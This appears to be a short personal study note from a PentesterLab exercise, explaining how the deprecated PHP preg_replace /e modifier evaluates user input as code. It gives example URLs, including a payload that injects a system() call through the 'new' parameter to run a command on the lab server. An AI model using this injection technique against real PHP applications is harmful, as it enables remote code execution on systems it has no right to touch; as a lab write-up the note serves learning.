---
tags: php

---

```ad-attention
This PHP function is __DEPRECATED__, as of PHP version __5.5.0__
```

Let’s take a url like:
```error
http://ptl-d96bbc999bc3-26c9fb9fec52.libcurl.me/?new=hacker&pattern=/lamer/&base=Hello%20lamer
```

Here, by adding the modifier `/e` here: new=hacker&pattern=/lamer__/e__&base=Hello, you can invoke an error message: 
```error
# **Notice**: Use of undefined constant hacker - assumed 'hacker' in **/var/www/index.php(14) : regexp code** on line **1**
```
And now, by replacing `hacker` with any function we can run it.

This is because `preg_replace` tries to evaluate hacker as a constant.

Here is an example payload I had to use in pentesterlabs:
```link
http://ptl-d96bbc999bc3-26c9fb9fec52.libcurl.me/?new=system(%27/usr/local/bin/score%20e6206710-c2c4-4704-869e-888e9947486e%27)&pattern=/lamer/e&base=Hello%20lamer
```